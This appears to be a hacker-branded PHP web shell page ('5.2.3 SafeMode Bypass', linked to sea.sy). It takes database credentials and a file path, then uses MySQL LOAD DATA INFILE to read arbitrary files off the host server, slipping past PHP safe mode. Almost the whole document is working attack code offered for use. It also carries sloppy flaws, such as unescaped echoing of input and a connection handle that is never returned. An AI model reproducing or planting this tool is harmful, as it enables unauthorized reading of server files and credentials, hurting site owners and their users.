
<html>
<head>
<title>SEA | 5.2.3 SafeMode Bypass .</title>
<link rel="shortcut icon" href='http://sea.sy/style/css/images/sea_en.png' />
<meta http-equiv=Content-Type content=text/html; charset=UTF-8>
<style type="text/css">

.neon{
	color:blue;
	text-shadow: 0 0 5px red,0 0 10px red, 0 0 30px orange, 0 0 45px yellow, 0 0 60px red;
	}
.neon2{
	font-size:15px;
	color:lime;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.neon3{
	color:yellow;
	text-shadow: 0 0 5px pink,0 0 10px pink, 0 0 30px #968, 0 0 45px #968, 0 0 60px #968
	}
.hacking{
	position:absolute;
	left:50px; font-size:35px;
	}
.like{
	border:4px double yellow;
	box-shadow:0px 2px 20px white;
	border-radius:10px;
	padding:9px;
	height:310px;}
	img{border:4px double yellow;
	box-shadow:0px 9px 15px white;
	border-radius:10px;
	opacity:0.75;
	-moz-opacity: 0.75;
	filter: alpha(opacity=75);
	}
a {
	text-decoration:none;}

</style>
<style>

@-webkit-keyframes tremer {
	0% {-webkit-transform: rotate(3deg);}
	50% {-webkit-transform: rotate(-3deg);}
	100% {-webkit-transform: rotate(3deg);}
	}
img:hover {
	-webkit-animation:tremer 0.2s linear infinite;
	-moz-animation:tremer 0.2s linear infinite;
	-o-animation:tremer 0.2s linear infinite;
	animation:tremer 0.2s linear infinite;
	}
</style>
<?php
$sh3llColor = "#0040FF";
echo CSS($sh3llColor)
?>
</head>
<!-- 5.2.3 Bypass -->
<center>
<p><img src="http://sea.sy/style/css/images/sea_en.png" height="200" width="400"</p>

<form enctype="multipart/form-data" method="POST">
  <table width='576' border='0' id='Box'>
    <tr>
<td width='4%' style="background:<?php echo $sh3llColor; ?>">&nbsp;</td>
<td colspan="2" >5.2.3 Bypass</td>
</tr>
	<tr>
      <td rowspan="5">&nbsp;</td>
      <td width="17%">HOST </td>
      <td width="79%">
      <input type="text" name="host" value="<?php if($_POST['host']){echo $_POST['host'];}else {echo "localhost";} ?>" /></td>
    </tr>
<tr>
  <td>USER</td>
  <td><input type="text" name="user" value="<?php if($_POST['user']){echo $_POST['user'];} ?>"  /></td>
</tr>
<tr>
  <td >PASS</td>
  <td ><input type="text" name="pass" value="<?php if($_POST['pass']){echo $_POST['pass'];} ?>" /></td>
</tr>
<tr>
  <td height="26">DB Name</td>
  <td ><input type="text" name="dbName" value="<?php if($_POST['dbName']){echo $_POST['dbName'];} ?>" /></td>
</tr>
<tr>
  <td height="26">File Path</td>
  <td><input type="text" name="filePath" value="<?php if($_POST['filePath']){echo filter($_POST['filePath']);}else {echo getcwd();} ?>" size="60" /></td>
</tr>
<tr><td colspan="3"><input type='submit' name='Read' value='Read File' id="exe" /></td></tr>
<?php
# --------------------------
#   5.2.3 SafeMode Bypass
#---------------------------
if($_POST['Read'] && $_POST['filePath'] != '')
{
	DBConnect($_POST['host'],$_POST['user'],$_POST['pass'],$_POST['dbName']);
	$unique = uniqid('N');
	$file = filter($_POST['filePath']);
	$query = array(
	"CREATE TEMPORARY TABLE $unique (file LONGBLOB)",
	"LOAD DATA INFILE '".mysql_real_escape_string($file)."' INTO TABLE $unique",
	"SELECT * FROM $unique"
	);
	echo '<tr><td colspan="3"><textarea name="result" cols="80" rows="20" >';
	foreach($query as $Allqueries)
	{
		$mysqlQuery = mysql_query($Allqueries,$connect);
		while($line = mysql_fetch_row($mysqlQuery))
		echo htmlspecialchars($line[0]);
		echo "\n
";
	}
	echo '</textarea></td></tr>';
}

?>
</table></form>
<!-- End Of 5.2.3 Bypass -->
</center>

<?php
function DBConnect($host,$user,$pass,$db)
{
	$connect = mysql_pconnect($host,$user,$pass);
	if(!$connect){echo "Can't Connect to [ ".$host." ] [ ".$user." ] [ ".$pass." ]"; return false;	}
	else
	{
		$tryToSelectDB = mysql_select_db($db,$connect);
		if(!$tryToSelectDB){echo "Can't Enter The Database [ ".$db." ]"; return false;		}
		else{return true; return $connect;}
	}
}
function footer()
{
	echo '<table bgcolor="#cccccc" width="100%"><tr>
	<td width="100%">
	<center><font color="gray" size="-2"><b>
	<font color="gray"></font><sy>   [
	</sy><font color="gray"></div><a href="http://www.sea.sy" target="_blank">www.sea.sy</a></font><sy> ]
	</sy></b>
	</td>
	</tr></table>
	</tbody>
	</body></html>
	';
}
function CSS($sh3llColor)
{
	$css =  "
	<style>
	BODY
	{
		FONT-FAMILY: Verdana; 
		margin: 2;
		color: #cccccc;
		background-color: #33363b;
	}
	sy  
	{
		color:".$sh3llColor.";
		font-size:7pt;
		font-weight: bold;
	}
	#Box
	{
	color:".$sh3llColor.";
	font-size:14px;
	background-color:#1C1C1C;
	font-weight:bold;
	width:500px;
	}
	tr 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #ffffff;
	}
	td 
	{
	BORDER-RIGHT:  #cccccc 1px solid;
	BORDER-TOP:    #cccccc 1px solid;
	BORDER-LEFT:   #cccccc 1px solid;
	BORDER-BOTTOM: #cccccc 1px solid;
	color: #cccccc;
	}
	table 
	{
	BORDER:  #eeeeee  outset;
	BACKGROUND-COLOR: #1C1C1C;
	color: #cccccc;
	}
	input 
	{
	BORDER-RIGHT:  ".$sh3llColor." 1px solid;
	BORDER-TOP:    ".$sh3llColor." 1px solid;
	BORDER-LEFT:   ".$sh3llColor." 1px solid;
	BORDER-BOTTOM: ".$sh3llColor." 1px solid;
	BACKGROUND-COLOR: #333333;
	font: 9pt tahoma;
	color: #ffffff;
	}
	select 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #000000;
	font: 9pt tahoma;
	color: #CCCCCC;;
	}
	submit 
	{
	BORDER:  1px outset buttonhighlight;
	BACKGROUND-COLOR: #272727;
	width: 40%;
	color: #cccccc;
	}
	textarea 
	{
	BORDER-RIGHT:  #ffffff 1px solid;
	BORDER-TOP:    #999999 1px solid;
	BORDER-LEFT:   #999999 1px solid;
	BORDER-BOTTOM: #ffffff 1px solid;
	BACKGROUND-COLOR: #333333;
	color: #ffffff;
	}
	A:link {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:visited { COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:active {COLOR:".$sh3llColor."; TEXT-DECORATION: none}
	A:hover {color:blue;TEXT-DECORATION: none}
	</style>";
	return $css;
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0)
	{
		return stripslashes($string);	
	}
	else
	{
		return $string;	
	}
}
footer();
?>
